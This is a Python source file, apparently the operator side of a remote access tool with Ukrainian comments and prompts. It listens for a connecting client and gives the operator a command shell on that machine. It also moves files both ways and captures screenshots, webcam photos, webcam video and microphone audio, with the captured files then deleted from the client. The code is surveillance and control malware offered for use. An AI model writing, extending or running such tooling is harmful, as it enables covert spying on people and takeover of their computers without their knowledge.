# Remote Control System
import os
import socket

PORT = 25254  # Порт, який використовувається сервером для прослуховування


def download(conn, filename):
    print("[]► Завантаження файлу:", filename)
    existing, file_size = conn.recv(BUFFER_SIZE).decode().split("<bober>")
    if existing == "exist":
        print("[]► Розмір файлу:", file_size)
        conn.send("ok".encode())
        file = open(filename, "wb")
        while True:
            print("[*]► Завантажується...")
            data = conn.recv(BUFFER_SIZE_I)
            try:
                if data.decode() == 'end':
                    print("[◘]► Завантаження завершено!")
                break
            except UnicodeDecodeError:
                pass
            file.write(data)
            print("[] Запис у файл –→", filename)
    else:
        print("Не можливо знайти такий файл ¯\_(ツ)_/¯")


def upload(conn, filename):
    if os.path.isfile(filename):
        file_size = os.path.getsize(filename)
        print("[]► Розмір файлу:", file_size)
        file = open(filename, "rb")
        while True:
            print("[*]► Вивантажується...")
            bytes_read = file.read(BUFFER_SIZE_I)
            try:
                if not bytes_read:
                    print("[◘]► Вивантаженення завершено!")
                    conn.send('end'.encode())
                    break
            except UnicodeDecodeError:
                pass
            conn.sendall(bytes_read)
            print("[] Запис у файл –→", filename)
    else:
        print("Не можливо знайти такий файл ¯\_(ツ)_/¯")


def help_menu():
    print("Доступні команди:\n"
          "♣ Інтерфейс командного рядка для даної ОС\n"
          "• download/upload {file} –→ завантаження та вивантаження файлу\n"
          "• screenshot –→ знімок екрану в даний момент часу\n"
          "• photo –→ зробити 1 фотографію за допомогою веб-камери\n"
          "• video –→ зробити 5с відеозапис із веб-камери\n"
          "• audio –→ зробити 10c аудіозапис за допомогою мікрофона\n"
          "• exit –→ вийти із сервера та клієнта\n"
          "• help –→ переглянути довідкове меню\n")


BUFFER_SIZE = 1024 * 128
BUFFER_SIZE_I: int = 4096

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("", PORT))
print("\nHello! This is simple Remote Control System ☻\n"
      f"[►] Прослуховування на :{PORT}")
sock.listen()
client_socket, address = sock.accept()
print(f"[►] З'єднано з {address[0]}:{address[1]}")
data = client_socket.recv(BUFFER_SIZE).decode()
client_os, directory = data.split("<bober>")
print(f"[◘] Під'єднано до {client_os} ОС\n")

while True:
    command = input(f"{directory}> ")
    if command == "":
        continue
    client_socket.send(command.encode())
    if command == "exit":
        info = client_socket.recv(1024).decode()  # Сервер отримує повідомлення про знищення клієнтської частини
        print(info)
        break
    temp = command.split(" ", 1)
    if temp[0] == "download":
        download(client_socket, temp[1])
        continue
    if temp[0] == "upload":
        upload(client_socket, temp[1])
        continue
    if temp[0] == "screenshot" or temp[0] == "photo" or temp[0] == "video" or temp[0] == "audio":
        filename = client_socket.recv(BUFFER_SIZE).decode()
        print(f"[]► {temp[0].capitalize()} було створено, намагаємось завантажити...")
        download(client_socket, filename)
        print(f"[]► {temp[0].capitalize()} було видалено із ОС клієнта")
        continue
    if temp[0] == "help":
        help_menu()
        continue
    data, directory = client_socket.recv(BUFFER_SIZE).decode().split("<bober>")
    print(data)

client_socket.close()
sock.close()
